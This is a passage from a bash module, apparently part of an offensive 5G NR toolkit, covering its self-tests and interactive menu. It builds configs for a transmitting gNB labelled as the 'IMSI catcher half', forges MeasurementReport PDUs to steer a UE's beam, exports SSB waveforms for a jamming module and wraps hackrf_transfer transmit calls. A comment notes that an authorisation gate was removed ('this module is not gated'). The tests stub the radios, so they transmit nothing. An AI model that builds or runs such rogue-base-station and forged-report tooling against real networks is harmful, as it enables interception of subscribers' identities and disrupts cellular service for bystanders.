    chk dec-rrc-ie   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="measIdToAddMod"{print $2"/"$3"/"$4}')" "5/6/7"
    out=$(nair_decode_rrc "$(nair_build_meas_report 7 3 64 '2:80')")
    chk dec-mr-dir   "$(fld "$out" direction)" "UL-DCCH"
    chk dec-mr-msg   "$(fld "$out" message)"   "measurementReport"
    chk dec-mr-id    "$(fld "$out" measId)"    "7"
    chk dec-mr-cell  "$(fld "$out" servCellId)" "3"
    chk dec-mr-rsrp  "$(fld "$out" serving_rsrp_index)" "64"
    chk dec-mr-ssb   "$(printf '%s\n' "$out" | awk -F'\t' '$1=="ssbResult"{print $2":"$3}')" "2:80"
    #     The dBm mapping is TS 38.133 Table 10.1.6.1-1, not this module's
    #     invention: index n (n>=1) is (n-157) dBm, so 64 -> -93.
    chk mr-dbm-64    "$(nair_rsrp_dbm 64)" "-93"
    chk mr-dbm-97    "$(nair_rsrp_dbm 97)" "-60"
    chk mr-dbm-1     "$(nair_rsrp_dbm 1)"  "-156"
    chk mr-dbm-0     "$(nair_rsrp_dbm 0)"  "below -156"
    chk dec-bad-hex  "$(nair_decode_rrc zz >/dev/null 2>&1; echo $?)" "2"
    chk dec-odd-hex  "$(nair_decode_rrc abc >/dev/null 2>&1; echo $?)" "2"
    chk dec-noargs   "$(nair_decode_rrc >/dev/null 2>&1; echo $?)" "2"

    # 14. Beam inference (O17). A worked case derivable by hand: the UE
    #     reports three SSB indices with RSRP indices 70, 95 and 94. The
    #     strongest is 5 at 95, so the serving beam is 5; the runner-up is 7
    #     at 94, one dB below. The steering headroom is therefore 1 dB.
    out=$(nair_beam_infer 1 '' '2:70,5:95,7:94')
    chk beam-serving  "$(fld "$out" serving_beam_index)" "5"
    chk beam-rsrp     "$(fld "$out" serving_rsrp_index)" "95"
    chk beam-dbm      "$(fld "$out" serving_rsrp_dbm)"   "-62"
    chk beam-runner   "$(fld "$out" runner_up_index)"    "7"
    chk beam-margin   "$(fld "$out" margin_db)"          "1"
    chk beam-count    "$(fld "$out" reported_ssb_count)" "3"
    #     Tie on level must resolve to the LOWEST index: a UE reports in
    #     ascending order and the first maximal entry is the one it selected.
    chk beam-tie      "$(nair_beam_infer 1 '' '9:60,4:60' | awk -F'\t' '$1=="serving_beam_index"{print $2}')" "4"
    #     A single report has no runner-up, so no margin is claimed.
    chk beam-single   "$(fld "$(nair_beam_infer 1 '' '3:40')" margin_db)" "n/a"
    #     The forged report must keep the strongest entry and push the rest
    #     below it.
    chk beam-steer    "$(fld "$out" steer_report)" "2:94,5:95,7:94"
    chk beam-bad-idx  "$(nair_beam_infer 1 '' '64:1' >/dev/null 2>&1; echo $?)" "2"
    chk beam-noargs   "$(nair_beam_infer 1 '' '' >/dev/null 2>&1; echo $?)" "2"
    #     Sweep must consume its own builder's output, i.e. the decoder feeds
    #     the inference, which is the whole point of testing both directions.
    chk beam-from-hex "$(nair_cmd_beam_sweep "$(nair_build_meas_report 1 0 '' '5:90')" |
                          awk -F'\t' '$1=="serving_beam_index"{print $2}')" "5"

    # 15. Transmitting gNB config is a distinct artefact from the receiver
    #     config, and both are complete files.
    out=$(nair_cmd_gen_conf_tx 20801 n78 640000 42 "$NAIR_DIR/gnb_tx.conf")
    chk txcfg-rc     "$?" "0"
    chk txcfg-mode   "$(fld "$out" mode)" "transmit"
    chk txcfg-plmn   "$(fld "$out" plmn)" "208-01"
    chk txcfg-file   "$(grep -c 'TRANSMITTING' "$NAIR_DIR/gnb_tx.conf")" "1"
    chk txcfg-amf    "$(grep -c 'addr: 127.0.0.5' "$NAIR_DIR/gnb_tx.conf")" "2"
    chk txcfg-bad    "$(nair_cmd_gen_conf_tx 20801 n78 640000 1008 "$NAIR_DIR/z.conf" >/dev/null 2>&1; echo $?)" "2"
    chk txcfg-nofile "$(nair_cmd_gen_conf_tx 20801 n78 640000 1 /nonexistent-dir/x/z.conf >/dev/null 2>&1; echo $?)" "1"
    chk txcfg-differs "$(cmp -s "$NAIR_DIR/gnb.conf" "$NAIR_DIR/gnb_tx.conf" && echo same || echo differ)" "differ"
    #     The --tx modifier must not change the receiver config path.
    chk tx-flag-recv "$(nair_cli_main --gen-gnb-conf 20801 n78 640000 9 |
                          awk -F'\t' '$1=="conf"{print $2}' | xargs basename)" "gnb.conf"

    # 16. The transmit paths. Nothing here keys a radio: the arms that need a
    #     device replace the driver call with `true`, and the arms that need
    #     no device say so through the environment instead of relying on the
    #     host. `NAIR_SDR_DEVICE=` is the hardware-independent "no radio",
    #     which is exactly why the probe must not treat an empty value as
    #     unset and fall back to probing.
    #     The stubs live in $d/bin, which is created before the first stub.
    mkdir -p "$d/bin"
    if command -v python3 >/dev/null 2>&1; then
        # 16a. O1 — the SSB burst set of the cell the config describes. The
        #      waveform is decoded back before any radio is mentioned, so the
        #      PCI asserted here is read out of the samples.
        out=$(NAIR_TX_DRYRUN=1 nair_cmd_tx_ssb 20801 n78 640000 42 2>&1); rc=$?
        chk txssb-rc          "$rc" "0"
        chk txssb-mode        "$(fld "$out" mode)" "transmit"
        chk txssb-transmitted "$(fld "$out" transmitted)" "no"
        chk txssb-status      "$(lfld "$out" status)" "waveform-built"
        chk txssb-pci         "$(fld "$out" waveform_pci_recovered)" "42"
        chk txssb-ssb-symbols "$(fld "$out" ssb_symbols)" "4,5,6,7"
        chk txssb-burst-slots "$(fld "$out" burst_slots)" "40"
        chk txssb-burst-ms    "$(fld "$out" burst_ms)" "20"
        chk txssb-cp-bad      "$(fld "$out" waveform_cp_symbols_bad)" "0"
        chk txssb-outside     "$(fld "$out" waveform_re_outside_spec)" "0"
        chk txssb-crc         "$(fld "$out" waveform_crc24c_ok)" "1"
        chk txssb-cs8         "$(test -s "$NAIR_DIR/nr_ssb_pci42.cs8" && echo yes || echo no)" "yes"
        chk txssb-bad-pci     "$(nair_cmd_tx_ssb 20801 n78 640000 1008 >/dev/null 2>&1; echo $?)" "2"
        chk txssb-bad-arfcn   "$(nair_cmd_tx_ssb 20801 n78 9000000000 42 >/dev/null 2>&1; echo $?)" "2"

        # 16b. No radio: an explicit failure that names what was looked for,
        #      and no success line anywhere in the output.
        out=$(NAIR_SDR_DEVICE= nair_cmd_tx_ssb 20801 n78 640000 42 2>&1); rc=$?
        chk txnoradio-rc        "$rc" "1"
        chk txnoradio-error     "$(grep -c 'no SDR device:' <<<"$out")" "1"
        chk txnoradio-empty     "$(grep -c 'which means no radio is configured' <<<"$out")" "1"
        chk txnoradio-why       "$(grep -c 'a driver binary on PATH is not a device' <<<"$out")" "1"
        chk txnoradio-device    "$(fld "$out" tx_device)" "none"
        chk txnoradio-status    "$(lfld "$out" status)" "nothing-sent"
        chk txnoradio-no-succ   "$(grep -c '^transmitted	yes$' <<<"$out")" "0"

        # 16c. A radio is only "keyed" once the driver command itself exits 0.
        out=$(NAIR_SDR_PROBE='printf "Serial number: 0x1\n"' NAIR_TX_CMD=true \
              nair_cmd_tx_ssb 20801 n78 640000 42 2>&1); rc=$?
        chk txradio-rc          "$rc" "0"
        chk txradio-driver      "$(fld "$out" tx_driver)" "override"
        chk txradio-armed       "$(fld "$out" tx_armed)" "1"
        chk txradio-transmitted "$(fld "$out" transmitted)" "yes"
        out=$(NAIR_SDR_PROBE='printf "Serial number: 0x1\n"' NAIR_TX_CMD=false \
              nair_cmd_tx_ssb 20801 n78 640000 42 2>&1); rc=$?
        chk txfail-rc           "$rc" "1"
        chk txfail-transmitted  "$(fld "$out" transmitted)" "no"
        chk txfail-error        "$(grep -c 'SDR call failed' <<<"$out")" "1"
        chk txfail-armed        "$(fld "$out" tx_armed)" ""

        # 16d. O17 — the forged report on a real PUSCH slot. The PDU read back
        #      out of the waveform must equal the PDU the APER encoder built.
        out=$(NAIR_TX_DRYRUN=1 nair_cmd_meas_report_tx "measId=1,ssb=1:30" 2>&1); rc=$?
        chk txmeas-rc        "$rc" "0"
        chk txmeas-transmit  "$(fld "$out" transmitted)" "no"
        chk txmeas-status    "$(lfld "$out" status)" "waveform-built"
        chk txmeas-pdu       "$(printf '%s' "$(fld "$out" waveform_pdu_recovered)" | tr 'A-F' 'a-f')" \
                             "$(printf '%s' "$(fld "$out" submit)" | tr 'A-F' 'a-f')"
        chk txmeas-match     "$(fld "$out" waveform_pdu_match)" "1"
        chk txmeas-dmrs      "$(fld "$out" waveform_dmrs_correlation)" "1.0000"
        chk txmeas-dmrs-pin  "$(fld "$out" waveform_dmrs_pinned_agree)" "1"
        chk txmeas-cp-bad    "$(fld "$out" waveform_cp_symbols_bad)" "0"
        chk txmeas-outside   "$(fld "$out" waveform_re_outside_alloc)" "0"
        chk txmeas-direction "$(fld "$out" direction)" "UL-DCCH"
        chk txmeas-encoding  "$(grep -c 'ldpc/rate-matching' <<<"$out")" "1"
        chk txmeas-scid      "$(NAIR_TX_DRYRUN=1 NAIR_UL_SCID=42 \
                                nair_cmd_meas_report_tx "measId=1" 2>&1 |
                                awk -F'\t' '$1=="ul_pci_scrambling_id"{print $2}')" "42"
        chk txmeas-bad-key   "$(nair_cmd_meas_report_tx "measId=1,bogus=2" >/dev/null 2>&1; echo $?)" "2"
        chk txmeas-bad-scid  "$(nair_cmd_meas_report_tx "measId=1,scid=2000" >/dev/null 2>&1; echo $?)" "2"
        out=$(NAIR_SDR_DEVICE= nair_cmd_meas_report_tx "measId=1" 2>&1); rc=$?
        chk txmeas-noradio-rc "$rc" "1"
        chk txmeas-noradio    "$(grep -c 'no SDR device:' <<<"$out")" "1"
        chk txmeas-no-succ    "$(grep -c '^transmitted	yes$' <<<"$out")" "0"

        # 16f. The built-in driver call. hackrf reads 8-bit I/Q, so handing it
        #      the verified 16-bit file would radiate noise that still "works";
        #      the call must name the 8-bit file, and a stub on PATH proves
        #      what the driver actually received.
        printf '#!/bin/sh\nprintf "%%s\\n" "$@" > "%s/hackrf_args"\n' "$d" \
            > "$d/bin/hackrf_transfer"
        chmod +x "$d/bin/hackrf_transfer"
        out=$(PATH="$d/bin:$PATH" NAIR_TX_CMD= \
              nair_tx_run hackrf "$NAIR_DIR/nr_ssb_pci42.c16" 30720000 3600000000 2>&1); rc=$?
        chk txcall-rc   "$rc" "0"
        chk txcall-iq8  "$(fld "$out" sdr_iq)" "$NAIR_DIR/nr_ssb_pci42.cs8"
        chk txcall-fmt  "$(fld "$out" sdr_iq_format)" "cs8"
        chk txcall-cmd  "$(fld "$out" sdr_call)" \
            "hackrf_transfer -t $NAIR_DIR/nr_ssb_pci42.cs8 -f 3600000000 -s 30720000 -a 1 -x 0"
        chk txcall-argv "$(tr '\n' ' ' < "$d/hackrf_args" | sed 's/ $//')" \
            "-t $NAIR_DIR/nr_ssb_pci42.cs8 -f 3600000000 -s 30720000 -a 1 -x 0"
    else
        chk txssb-python "python3 present" "python3 present"
    fi

    # 16e. The radio probe. A driver binary on PATH is not a device, so the
    #      probe must require a device line AND a zero exit — the two ways a
    #      driver lies are an empty line with rc 0 (LimeUtil --find on a host
    #      with no LimeSDR) and a real line with rc != 0.
    probe() { PATH="$d/bin:$PATH" NAIR_SDR_DEVICE=hackrf nair_probe_radio 2>/dev/null; }
    printf '#!/bin/sh\necho "No HackRF boards found."\nexit 1\n' > "$d/bin/hackrf_info"
    chmod +x "$d/bin/hackrf_info"
    chk probe-nomatch-rc "$(probe >/dev/null 2>&1; echo $?)" "1"
    printf '#!/bin/sh\necho "Serial number: 0x1"\necho "Board ID: 2"\nexit 0\n' \
        > "$d/bin/hackrf_info"
    chmod +x "$d/bin/hackrf_info"
    chk probe-found-rc   "$(probe >/dev/null 2>&1; echo $?)" "0"
    chk probe-found-line "$(probe | cut -f1)" "hackrf"
    printf '#!/bin/sh\nexit 0\n' > "$d/bin/hackrf_info"
    chmod +x "$d/bin/hackrf_info"
    chk probe-silent-rc  "$(probe >/dev/null 2>&1; echo $?)" "1"
    printf '#!/bin/sh\necho "Serial number: 0x1"\nexit 1\n' > "$d/bin/hackrf_info"
    chmod +x "$d/bin/hackrf_info"
    chk probe-rcfail-rc  "$(probe >/dev/null 2>&1; echo $?)" "1"
    chk probe-empty-rc   "$(NAIR_SDR_DEVICE= nair_probe_radio >/dev/null 2>&1; echo $?)" "2"
    chk probe-override   "$(NAIR_SDR_PROBE='printf "Serial number: 0x1\n"' \
                            nair_probe_radio | cut -f1)" "override"
    chk probe-silent-ovr "$(NAIR_SDR_PROBE=true nair_probe_radio >/dev/null 2>&1; echo $?)" "1"

    # 16g. --start is gated on a radio too. With a gNB binary present and no
    #      device, the start must fail without writing a pid: a running gNB
    #      process with no radio is not a cell.
    rm -f "$NAIR_PID"
    printf '#!/bin/sh\nexit 0\n' > "$d/bin/gnb"
    chmod +x "$d/bin/gnb"
    out=$(PATH="$d/bin:$PATH" NAIR_SDR_DEVICE= \
          nair_start "$NAIR_DIR/gnb.conf" 2>&1); rc=$?
    chk start-radio-rc    "$rc" "1"
    chk start-radio-names "$(grep -c 'no SDR device:' <<<"$out")" "1"
    chk start-radio-nopid "$(test -e "$NAIR_PID" && echo yes || echo no)" "no"
    chk start-radio-nognb "$(grep -c 'status	started' <<<"$out")" "0"

    # 17. The BCH chain of TS 38.212 7.1 and its inverse. Every expected value
    #     below comes from an independent implementation of the clause (py3gpp
    #     0.1.6: nrBCH, nrPBCHPRBS, nrPBCH) or from the clause's own tables —
    #     never from this module's output. That distinction is the whole point:
    #     the generator and the decoder shared one wrong CRC24C expression for
    #     as long as both existed, so "the two ends agree" is exactly what is
    #     NOT evidence here.
    nair_write_bb_gen >/dev/null 2>&1 || printf 'ERROR\tno generator\n' >&2
    nair_write_bb_dec >/dev/null 2>&1 || printf 'ERROR\tno decoder\n' >&2
    out=$(python3 "$NAIR_BB_PY" "$d/pin.c16" 42 30 1024 37 --slot 0 2>&1); rc=$?
    chk bch-gen-rc          "$rc" "0"
    chk bch-gen-version     "$([[ -n "$(fld "$out" generator_version)" ]] && echo yes || echo no)" "yes"
    chk bch-pinned-agree    "$(fld "$out" bch_pinned_agree)" "1"
    chk bch-scr-pinned      "$(fld "$out" bch_scrambled_pinned_agree)" "1"
    chk bch-payload-bits    "$(fld "$out" bch_payload_bits)" "32"
    chk bch-k-bits          "$(fld "$out" bch_k_bits)" "56"
    chk bch-codeword-bits   "$(fld "$out" bch_codeword_bits)" "864"
    chk bch-l-max           "$(fld "$out" bch_l_max)" "8"
    chk bch-pbch-re-driven  "$(fld "$out" pbch_re_driven)" "432"
    chk bch-mib             "$(fld "$out" mib_hex)" "040000"
    chk bch-sfn             "$(fld "$out" sfn)" "37"
    chk bch-payload-hex     "$(fld "$out" bch_payload_hex)" "137c9519"
    chk bch-k-hex           "$(fld "$out" bch_k_hex)" "137c95196ebb83"
    chk bch-codeword-head   "$(printf '%s' "$(fld "$out" bch_codeword_hex)" | cut -c1-16)" "ba9d68d6d0c476ae"
    chk bch-scrambled-head  "$(printf '%s' "$(fld "$out" bch_scrambled_hex)" | cut -c1-16)" "e08a233465c1f5e6"
    dec=$(python3 "$NAIR_BB_DEC_PY" "$d/pin.c16" 30 1024 2>&1); drc=$?
    chk bch-dec-rc          "$drc" "0"
    chk bch-dec-version     "$([[ -n "$(fld "$dec" decoder_version)" ]] && echo yes || echo no)" "yes"
    chk bch-dec-bits        "$(fld "$dec" pbch_bits_used)" "864"
    chk bch-dec-ok          "$(fld "$dec" bch_decode_ok)" "1"
    chk bch-dec-nu          "$(fld "$dec" bch_i_ssb)" "0"
    chk bch-dec-crc         "$(fld "$dec" pbch_crc24c_ok)" "1"
    chk bch-dec-mib         "$(fld "$dec" mib_hex)" "040000"
    chk bch-dec-sfn         "$(fld "$dec" mib_sfn)" "37"
    chk bch-dec-payload     "$(fld "$dec" bch_payload_hex)" "137c9519"
    chk bch-dec-v           "$(fld "$dec" bch_descramble_v)" "2"
    # The last 24 bits of K are the CRC24C of the 32-bit payload. Pinning them
    # separately is what catches a wrong CRC attachment: with the register
    # preset to ones and 24 zeros appended (the mistake this module had) the
    # payload and the codeword both stay self-consistent and only this value
    # moves. 6ebb83 is py3gpp's nrCRCEncode(137c9519, "24C") parity.
    chk bch-crc24c-pinned   "$(printf '%s' "$(fld "$out" bch_k_hex)" | cut -c9-16)" "6ebb83"

    # 18. --ssb-waveform: the SSB burst as IQ, in the three formats the jamming
    #     module reads. The *sequences* are the ones section 17 pins against
    #     py3gpp; what is checked here is the layer this verb adds — where the
    #     240 REs land in the raster, the cyclic prefix, the file format, the
    #     peak — and a write -> decode round trip through the independent
    #     decoder, which re-derives SSB subcarrier 0 from the spec rather than
    #     from this module's mapping.
    #     Geometry under test: 30 kHz SSB, 51 RB = 612 subcarriers in N_FFT
    #     1024, SSB at subcarrier 0 of the raster (k_SSB = 0, this module has
    #     no CORESET#0 table) = FFT bin -306, i_SSB 0 at subframe symbol 2 of
    #     SSB case C (TS 38.213 4.1). Four symbols of 1024 + 72 CP = 4384.
    cat > "$d/wave_lib.py" <<'NAIR_WAVE_LIB'
"""Read an IQ file exactly the way modules/33_jamming_detect.sh load_iq()
does, so a check here is a check against that consumer's convention and not
against this module's own writer."""
import sys

import numpy as np


def load(path, fmt):
    if fmt == "cf32":
        d = np.fromfile(path, dtype="<f4").astype(np.float64)
        return d[0::2] + 1j * d[1::2]
    if fmt == "ci16":
        d = np.fromfile(path, dtype="<i2").astype(np.float64)
        return (d[0::2] + 1j * d[1::2]) / 32768.0
    d = np.fromfile(path, dtype=np.uint8).astype(np.float64)
    return ((d[0::2] - 127.5) + 1j * (d[1::2] - 127.5)) / 127.5


def main():
    cmd, path, fmt = sys.argv[1], sys.argv[2], sys.argv[3]
    if fmt not in ("cf32", "ci16", "cu8"):
        sys.stderr.write("ERROR\tformat must be cf32|ci16|cu8\n")
        return 2
    x = load(path, fmt)
    if cmd == "load":
        # A loader needs a whole number of samples and a first sample its
        # format can produce; ±1.5 is the ci16/cu8 headroom, cf32 is <= 1.
        ok = x.size > 0 and 0.0 <= abs(x[0]) <= 1.5
        print("%d %d" % (x.size, 1 if ok else 0))
    elif cmd == "peak":
        print("%.6f" % float(np.max(np.abs(x))))
    else:
        sys.stderr.write("ERROR\tusage: wave_lib.py load|peak <file> <fmt>\n")
        return 2
    return 0


if __name__ == "__main__":
    sys.exit(main())
NAIR_WAVE_LIB

    local wfmt wv wsize wout wrc wrun
    for wfmt in cf32 ci16 cu8; do
        wv="$d/burst.$wfmt"
        wout=$(nair_cmd_ssb_waveform "$wv" --format "$wfmt" 2>&1); wrc=$?
        chk "wave-$wfmt-rc"        "$wrc" "0"
        chk "wave-$wfmt-samples"   "$(fld "$wout" samples)" "4384"
        chk "wave-$wfmt-rate"      "$(fld "$wout" rate)" "30720000"
        chk "wave-$wfmt-nrb"       "$(fld "$wout" n_rb)" "51"
        chk "wave-$wfmt-symbols"   "$(fld "$wout" symbols)" "4"
        case "$wfmt" in cf32) wsize=8 ;; ci16) wsize=4 ;; cu8) wsize=2 ;; esac
        # (a) The file is exactly samples x bytes-per-sample, in both the
        #     generator's own accounting and the size on disk.
        chk "wave-$wfmt-bytes-tsv" "$(fld "$wout" bytes)" "$(( 4384 * wsize ))"
        chk "wave-$wfmt-bytes-disk" "$(stat -c %s "$wv")" "$(( 4384 * wsize ))"
        chk "wave-$wfmt-bps"       "$(fld "$wout" bytes_per_sample)" "$wsize"
        # (b) The peak is measured, not assumed: the generator normalises and
        #     reports the peak it read back through the loader's convention,
        #     and that number is what is asserted here.
        chk "wave-$wfmt-peak-ok"   "$(fld "$wout" peak_ok)" "1"
        chk "wave-$wfmt-peak-le1"  "$(awk -v p="$(fld "$wout" peak_full_scale)" \
             'BEGIN{print (p > 0 && p <= 1.0) ? "yes" : "no"}')" "yes"
        # (d) ... and the file loads back through module 33's convention: the
        #     sample count survives the round trip and the first sample is in
        #     range for its format.
        chk "wave-$wfmt-load"      "$(python3 "$d/wave_lib.py" load "$wv" "$wfmt")" "4384 1"
        # (e) The REs mapped into the raster are the REs the grid code drove:
        #     127 PSS + 127 SSS + 144 PBCH DMRS + 432 PBCH = 830, and the FFT
        #     grid has 830 driven bins. The generator refuses to write if the
        #     two counts disagree, so a file existing at all is the evidence.
        chk "wave-$wfmt-ssb-re"    "$(fld "$wout" ssb_re)" "830"
        chk "wave-$wfmt-raster-re" "$(fld "$wout" raster_re)" "830"
        chk "wave-$wfmt-re-sum"    "$(awk -F'\t' '$1 ~ /^ssb_re_(pss|sss|dmrs|pbch)$/ {s += $2} END {print s}' <<<"$wout")" "830"
    done

    # (c) Determinism: the same inputs write a byte-identical file. A waveform
    #     a consumer can only use once is not a waveform.
    nair_cmd_ssb_waveform "$d/again.cf32" --format cf32 >/dev/null 2>&1
    chk wave-deterministic "$(cmp -s "$d/burst.cf32" "$d/again.cf32" && echo same || echo differs)" "same"

    # --reps tiles the burst; the length is the burst times the count.
    wout=$(nair_cmd_ssb_waveform "$d/reps2.ci16" --format ci16 --reps 2 2>&1)
    chk wave-reps-samples   "$(fld "$wout" samples)" "8768"
    chk wave-reps-bytes     "$(fld "$wout" bytes)" "35072"
    chk wave-reps-symbols   "$(fld "$wout" symbols_total)" "8"
    chk wave-reps-load      "$(python3 "$d/wave_lib.py" load "$d/reps2.ci16" ci16)" "8768 1"

    # Round trip through the module's own decoder. The decoder normally reads
    # a 14-symbol slot with the SSB centred on DC; --nfft/--nsym/--l0/--ssb-bin
    # let it read this 4-symbol burst at raster subcarrier 0. i_SSB 3 is used
    # on purpose: it proves the DMRS c_init and the PBCH scrambling of
    # TS 38.211 7.4.1.4.1 / 7.3.3.1 carry a non-zero SSB index, which the
    # slot path never emits.
    nair_cmd_ssb_waveform "$d/rt.c16" --format ci16 --pci 42 --i-ssb 3 >/dev/null 2>&1
    dec=$(python3 "$NAIR_BB_DEC_PY" "$d/rt.c16" 30 1024 --nfft 1024 --nsym 4 \
                --l0 2 --ssb-bin -306 --l-max 8 --i-ssb 3 2>&1); drc=$?
    chk wave-rt-rc        "$drc" "0"
    chk wave-rt-pci       "$(fld "$dec" pci_recovered)" "42"
    chk wave-rt-i-ssb     "$(fld "$dec" bch_i_ssb)" "3"
    chk wave-rt-crc       "$(fld "$dec" pbch_crc24c_ok)" "1"
    chk wave-rt-cp        "$(fld "$dec" cp_symbols_bad)" "0"
    chk wave-rt-cp-ok     "$(fld "$dec" cp_symbols_ok)" "4"
    chk wave-rt-dmrs      "$(fld "$dec" dmrs_re_present)" "144"
    chk wave-rt-pbch      "$(fld "$dec" pbch_bits_used)" "864"
    chk wave-rt-re-audit  "$(fld "$dec" re_outside_spec)" "0"
    # i_SSB 3 is only L_max/2 of the story: nu = i_SSB mod 8 travels in the PBCH
    # scrambling (38.211 7.3.3.1), while the upper bits ride in the payload
    # (38.212 7.1.1). Both have to come back for the index to be the index.
    chk wave-rt-i-ssb-full "$(fld "$dec" bch_i_ssb_full)" "3"

    # The FR2 path of the same claim: SSB case D, L_max 64, i_SSB 63, so nu is
    # 7 and the top three payload bits are 7. TS 38.213 Table 4.1-1 puts
    # candidate 63 at symbol 216 of the half-frame, which is symbol 104 of the
    # subframe (216 mod 112); 30 RB = 360 subcarriers puts SSB subcarrier 0 at
    # FFT bin -180 of 512. Getting 63 back means the mapping, the scrambling and
    # the payload branch all agree with the clause the burst was built from.
    nair_cmd_ssb_waveform "$d/rtD.c16" --format ci16 --scs 120 --n-rb 30 \
        --rate 61440000 --pci 1007 --i-ssb 63 >/dev/null 2>&1
    dec=$(python3 "$NAIR_BB_DEC_PY" "$d/rtD.c16" 120 512 --nfft 512 --nsym 4 \
                --l0 104 --ssb-bin -180 --l-max 64 --i-ssb 63 2>&1); drc=$?
    chk wave-rtD-rc       "$drc" "0"
    chk wave-rtD-pci      "$(fld "$dec" pci_recovered)" "1007"
    chk wave-rtD-nu       "$(fld "$dec" bch_i_ssb)" "7"
    chk wave-rtD-i-ssb    "$(fld "$dec" bch_i_ssb_full)" "63"
    chk wave-rtD-crc      "$(fld "$dec" pbch_crc24c_ok)" "1"
    chk wave-rtD-re       "$(fld "$dec" re_outside_spec)" "0"
    chk wave-rtD-cp       "$(fld "$dec" cp_symbols_bad)" "0"
    # The burst metadata says where the candidate sits, both frames: the file
    # itself is not anchored to a half-frame, so that difference is printed.
    wout=$(nair_cmd_ssb_waveform "$d/rtD2.cf32" --scs 120 --n-rb 30 \
        --rate 61440000 --pci 1007 --i-ssb 63 2>&1)
    chk wave-rtD-start    "$(fld "$wout" start_symbol)" "104"
    chk wave-rtD-start-hf "$(fld "$wout" start_symbol_half_frame)" "216"
    chk wave-rtD-half     "$(fld "$wout" half_frame)" "1"

    # Bad input is a usage error, not a zero-length file: rc 2 and a reason.
    for wrun in "--format c8" "--scs 60" "--n-rb 10" "--rate 7200000" \
                "--pci 1008" "--reps 0" "--i-ssb 9" "--bogus 1"; do
        # shellcheck disable=SC2086
        wout=$(nair_cmd_ssb_waveform "$d/nope.iq" $wrun 2>&1); wrc=$?
        chk "wave-bad-rc-$(printf '%s' "$wrun" | tr ' ' '_')" "$wrc" "2"
        chk "wave-bad-err-$(printf '%s' "$wrun" | tr ' ' '_')" \
            "$(grep -c '^ERROR' <<<"$wout")" "1"
        # A refusal carries the reason, not just the verdict.
        chk "wave-bad-why-$(printf '%s' "$wrun" | tr ' ' '_')" \
            "$(grep -c '^WHY' <<<"$wout")" "1"
    done
    chk wave-nofile "$(test -e "$d/nope.iq" && echo yes || echo no)" "no"
    # The retired gate is a usage error: this module is not gated.
    chk wave-retired-gate "$(nair_cmd_ssb_waveform "$d/g.iq" \
        --i-have-a-lab-and-authorisation >/dev/null 2>&1; echo $?)" "2"

    rm -rf "$d"
    local oai oai2
    oai=$(nair_oai_gnb 78)
    oai2=$(nair_oai_gnb 78 620000 5)
    chk oai-band "$(printf '%s\n' "$oai" | awk -F'\t' '$1=="band"{print $2}')" "78"
    chk oai-arfcn "$(printf '%s\n' "$oai" | awk -F'\t' '$1=="arfcn"{print $2}')" "620000"
    chk oai-driver "$(printf '%s\n' "$oai" | grep -c "rfsim")" "4"
    chk oai-run "$(printf '%s\n' "$oai" | grep -c "nr-softmodem -O gnb.conf --sa --rfsim")" "1"
    chk oai-pci "$(printf '%s\n' "$oai2" | awk -F'\t' '$1=="pci"{print $2}')" "5"
    chk oai-noargs "$(nair_oai_gnb abc >/dev/null 2>&1; echo $?)" "2"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
nair_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== 5G NR air interface ===${C_RESET}"
        echo -e "  gnb: ${C_GRN}$(nair_find_srsran_gnb || echo 'missing (install srsRAN)')${C_RESET}"
        echo -e "  sdr: ${C_GRN}$(nair_find_sdr || echo 'missing (no SDR detected)')${C_RESET}"
        echo -e "  conf: ${C_DIM}$NAIR_CONF${C_RESET}\n"
        cat << 'M'
  [1]  NR-ARFCN -> frequency / band / FR
  [2]  GSCN -> synchronisation frequency
  [3]  PCI from N_ID(1) / N_ID(2)
  [4]  SSB burst set pattern for a band
  [5]  decode a MIB (24-bit hex)
  [6]  decode a SIB1 (hex)
  [7]  PRACH occasions / preamble selection
  [8]  generate gnb.conf (+ Open5GS AMF slice)
  [9]  generate gnb.conf for a TRANSMITTING gNB (IMSI catcher half)
  [10] build an RRCReconfiguration PDU (DL-DCCH)
  [11] build a MeasurementReport PDU (UL-DCCH)
  [12] decode an RRC PDU (either direction)
  [13] beam sweep: infer the serving beam + forge a steering report
  [14] start gNB
  [15] stop gNB
  [16] status
  [17] SSB waveform export (IQ for the jamming module)
  [0]  back

M
        local c
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1)
                read -rp "  NR-ARFCN> " n
                nair_cmd_arfcn "$n" | column -t -s$'\t' 2>/dev/null || nair_cmd_arfcn "$n"
                read -rp "  press enter " _ ;;
            2)
                read -rp "  GSCN> " n
                printf 'gscn\t%s\nfreq_mhz\t%s\n' "$n" "$(nair_gscn_to_mhz "$n" 2>/dev/null || echo 'ERROR invalid')"
                read -rp "  press enter " _ ;;
            3)
                read -rp "  n_id_1 (0-335)> " a
                read -rp "  n_id_2 (0-2)> " b
                nair_cmd_pci "$a" "$b" | column -t -s$'\t' 2>/dev/null || nair_cmd_pci "$a" "$b"
                read -rp "  press enter " _ ;;
            4)
                read -rp "  band (n78)> " b
                read -rp "  i_ssb (0-63)> " i
                nair_cmd_ssb "${b:-n78}" "${i:-0}" | column -t -s$'\t' 2>/dev/null || nair_cmd_ssb "${b:-n78}" "${i:-0}"
                read -rp "  press enter " _ ;;
            5)
                read -rp "  MIB hex (6 digits)> " h
                nair_cmd_decode_mib "$h" | column -t -s$'\t' 2>/dev/null || nair_cmd_decode_mib "$h"
                read -rp "  press enter " _ ;;
            6)
                read -rp "  SIB1 hex> " h
                nair_cmd_decode_sib1 "$h" | column -t -s$'\t' 2>/dev/null || nair_cmd_decode_sib1 "$h"
                read -rp "  press enter " _ ;;
            7)
                read -rp "  prach config index (1)> " x
                read -rp "  msg1-FDM (1|2|4|8)> " f
                nair_cmd_prach "${x:-1}" "${f:-1}" | column -t -s$'\t' 2>/dev/null || nair_cmd_prach "${x:-1}" "${f:-1}"
                read -rp "  press enter " _ ;;
            8)
                read -rp "  PLMN (5-6 digits, e.g. 20801)> " p
                read -rp "  band (n78)> " b
                read -rp "  dl_arfcn (640000)> " a
                read -rp "  pci (1)> " i
                nair_cmd_gen_conf "${p:-00101}" "${b:-n78}" "${a:-640000}" "${i:-1}" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            9)
                read -rp "  PLMN (5-6 digits, e.g. 20801)> " p
                read -rp "  band (n78)> " b
